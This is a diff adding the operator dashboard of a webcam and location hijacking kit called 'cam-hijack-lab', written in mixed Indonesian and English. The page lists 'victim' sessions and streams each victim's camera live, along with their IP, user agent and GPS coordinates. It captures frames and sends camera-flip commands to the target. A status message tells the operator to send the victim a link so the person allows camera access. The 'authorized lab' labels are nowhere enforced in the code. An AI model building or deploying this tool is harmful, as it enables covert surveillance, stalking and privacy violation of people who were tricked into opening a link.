@@ -1,0 +1,162 @@
+<!doctype html>
+<html><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>MONITOR · cam-hijack-lab</title>
+<style>
+ :root{--navy:#13264a;--teal:#22c6b6;--bg:#0d1420;--card:#131c2b;--line:#22304a}
+ *{box-sizing:border-box}
+ body{margin:0;background:var(--bg);color:#dbe4f0;font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif}
+ header{background:var(--navy);padding:14px 22px;border-left:8px solid var(--teal)}
+ header h1{margin:0;font-size:15px;letter-spacing:.4px}
+ header p{margin:3px 0 0;font-size:11.5px;color:#93a5bd}
+ .autobadge{display:inline-block;background:#22c6b6;color:#062b28;font:700 10.5px ui-monospace,monospace;padding:2px 8px;border-radius:99px;margin-left:8px}
+ main{max-width:1150px;margin:0 auto;padding:18px 18px 50px}
+ .grid{display:grid;grid-template-columns:3fr 2fr;gap:14px}
+ @media(max-width:900px){.grid{grid-template-columns:1fr}}
+ .card{background:var(--card);border:1px solid var(--line);border-radius:8px;padding:12px}
+ .card h3{margin:0 0 10px;font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:var(--teal)}
+ .feed{position:relative;background:#000;border-radius:6px;overflow:hidden;aspect-ratio:16/9;display:flex;align-items:center;justify-content:center}
+ .feed img{width:100%;height:100%;object-fit:cover;display:block}
+ .feed .idle{color:#5d6f88;font-size:13px;padding:0 20px;text-align:center;white-space:pre-line}
+ .rec{position:absolute;top:8px;left:10px;color:#ff6b6b;font:700 11px ui-monospace,monospace;display:none;z-index:2}
+ .rec i{display:inline-block;width:7px;height:7px;border-radius:99px;background:#ff4444;margin-right:5px;animation:bl 1s infinite}
+ @keyframes bl{50%{opacity:.25}}
+ .row{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px;align-items:center}
+ button{background:var(--teal);border:0;border-radius:5px;padding:8px 14px;font:600 12.5px inherit;color:#062b28;cursor:pointer}
+ button:disabled{opacity:.35;cursor:not-allowed}
+ .kv{font:12px/1.7 ui-monospace,Menlo,monospace;color:#9fb0c0;background:#0f1726;border:1px solid var(--line);border-radius:6px;padding:8px 10px;white-space:pre-wrap;word-break:break-word;min-height:44px}
+ .kv a{color:var(--teal)}
+ footer{max-width:1150px;margin:0 auto;padding:0 18px 30px;color:#54657d;font-size:11px}
+</style>
+</head>
+<body>
+<header>
+  <h1>MONITOR · <span id="sidTitle">—</span><span class="autobadge" id="autobadge" style="display:none">OTOMATIS</span></h1>
+  <p>authorized lab demonstration · in-memory only · no audio · captures hanya manual</p>
+</header>
+<main>
+  <div class="grid">
+    <div class="card">
+      <h3>Live camera</h3>
+      <div id="feedbox"><div class="feed"><span class="idle">waiting…</span></div></div>
+      <div class="row">
+        <button id="cap" disabled>Capture frame (evidence)</button>
+        <button id="flip" disabled style="background:#22303c;color:#9fb0c0;margin-left:4px">Flip kamera target</button>
+        <select id="devsel" style="display:none;background:#0f1726;color:#9fb0c0;border:1px solid var(--line);border-radius:5px;padding:8px 10px;font:12.5px inherit"></select>
+      </div>
+    </div>
+    <div class="card">
+      <h3>Session &amp; location</h3>
+      <div class="kv" id="info">memuat…</div>
+      <h3 style="margin-top:14px">Captured frames</h3>
+      <div class="kv" id="caps">—</div>
+    </div>
+  </div>
+</main>
+<footer>HEYRM LAB · authorized training only · frame yang muncul harus dari perangkat lab milikmu.</footer>
+<script>
+const m = location.pathname.match(/\/m\/([A-Za-z0-9]+)/);
+const PIN = m ? m[1] : (new URLSearchParams(location.search).get("sid") || "");
+const AUTO = !PIN;
+let curSid = PIN;
+const el = (id) => document.getElementById(id);
+let urls = [];
+if (AUTO) el("autobadge").style.display = "inline-block";
+
+function label(sid){
+  el("sidTitle").textContent = sid || (AUTO ? "*" : PIN);
+  document.title = "MONITOR " + (sid || (AUTO ? "*" : PIN)) + " · cam-hijack-lab";
+}
+
+async function j(u){ const r = await fetch(u, {cache:"no-store"}); return r.ok ? r.json() : null; }
+
+async function refresh(){
+  const items = (await j("/api/sessions")) || [];
+  let s;
+  if (PIN) s = items.find(x => x.sid === PIN);
+  else {
+    const withCam = items.filter(x => x.cam);
+    const pool = withCam.length ? withCam : items;
+    s = pool.length ? pool.reduce((a,b) => b.last_seen > a.last_seen ? b : a) : null;
+  }
+  if (!s){
+    const live = items.map(x => '<a href="/m/' + x.sid + '">' + x.sid + (x.cam ? " [cam]" : "") + "</a>").join(", ");
+    el("info").innerHTML = (AUTO ? "Belum ada session live." : "SID " + PIN + " tidak ada di session aktif.") +
+      (live ? "\nSession live sekarang: " + live : "\n(link victim belum dibuka, atau server baru di-restart.)");
+    if (AUTO) el("feedbox").innerHTML = '<div class="feed"><span class="idle">Menunggu target masuk…\nKirim link victim, izinkan kamera, feed muncul otomatis di sini.</span></div>';
+    return;
+  }
+  curSid = s.sid;
+  if (AUTO) label(s.sid);
+  const g = s.geo;
+  el("info").textContent =
+    (AUTO ? "sid(auto): " : "sid      : ") + s.sid + "\n" +
+    "ip       : " + (s.ip || "?") + "\n" +
+    "devices  : " + (s.ndev || 0) + (s.select ? "  (pin: " + s.select + ")" : "") + "\n" +
+    "state    : " + (s.killed ? "DEAD (dihentikan)" : "active") + "\n" +
+    "ua       : " + (s.ua || "?") + "\n" +
+    "start    : " + new Date(s.created * 1000).toLocaleString() + "\n" +
+    "last seen: " + new Date(s.last_seen * 1000).toLocaleString() + "\n" +
+    "camera   : " + (s.cam ? "LIVE" + (s.frame_ts ? "  (" + new Date(s.frame_ts * 1000).toLocaleTimeString() + ")" : "") : "—") + "\n" +
+    "location : " + (g ? g.lat.toFixed(5) + ", " + g.lon.toFixed(5) + "   \u00b1" + Math.round(g.acc) + " m  (" + new Date(g.ts * 1000).toLocaleTimeString() + ")" : "—");
+  const caps = (await j("/api/captures")) || [];
+  const my = caps.filter(f => f.startsWith(s.sid + "_"));
+  el("caps").textContent = my.length ? my.join("\n") : "— none yet (use capture frame)";
+  el("cap").disabled = !s.cam || s.killed;
+  el("flip").disabled = !s.cam || s.killed;
+  if (PIN) {
+    const dv = await j("/api/devices/" + s.sid);
+    const dvEl = el("devsel");
+    if (dv && dv.devices.length) {
+      dvEl.style.display = "";
+      const cur = dv.select || "";
+      dvEl.innerHTML = '<option value=""' + (cur ? "" : " selected") + '>AUTO: last writer (' + dv.devices.length + ' device)</option>' +
+        dv.devices.map(x => '<option value="' + x.did + '"' + (cur === x.did ? " selected" : "") + '>' + (x.ip || x.did) + (x.cam ? '' : ' [no cam]') + '</option>').join("");
+      dvEl.onchange = async () => {
+        await fetch("/api/select/" + s.sid, { method: "POST", body: JSON.stringify({ did: dvEl.value || null }), cache: "no-store" });
+      };
+    } else { dvEl.style.display = "none"; dvEl.innerHTML = ""; }
+  }
+}
+
+async function tickFeed(){
+  if (!curSid) return;
+  const box = el("feedbox");
+  if (!box.querySelector("img")) {
+    box.innerHTML = '<div class="feed" style="aspect-ratio:16/9"><span class="rec" style="display:none"><i></i>LIVE</span><img alt=""></div>';
+  }
+  const r = await fetch("/api/feed/" + curSid + "?t=" + Date.now(), { cache: "no-store" });
+  const img = box.querySelector("img");
+  const rec = box.querySelector(".rec");
+  if (r.ok){
+    const url = URL.createObjectURL(await r.blob());
+    urls.push(url);
+    if (urls.length > 3) URL.revokeObjectURL(urls.shift());
+    img.src = url;
+    rec.style.display = "block";
+  } else {
+    rec.style.display = "none";
+  }
+}
+
+el("flip").onclick = async () => {
+  if (!curSid) { alert("Belum ada session aktif."); return; }
+  const r = await fetch("/api/cmd/" + curSid, { method: "POST", body: JSON.stringify({ act: "flip" }), cache: "no-store" });
+  if (r.ok) alert("perintah flip dikirim ke target");
+  else alert("gagal kirim perintah");
+};
+
+el("cap").onclick = async () => {
+  if (!curSid){ alert("Belum ada session aktif."); return; }
+  const d = await j("/api/capture/" + curSid);
+  if (d && d.file){ alert("saved: captures/" + d.file); refresh(); }
+  else alert("no frame to capture");
+};
+
+label("");
+refresh();
+setInterval(refresh, 2000);
+setInterval(tickFeed, 700);
+</script>
+</body></html>
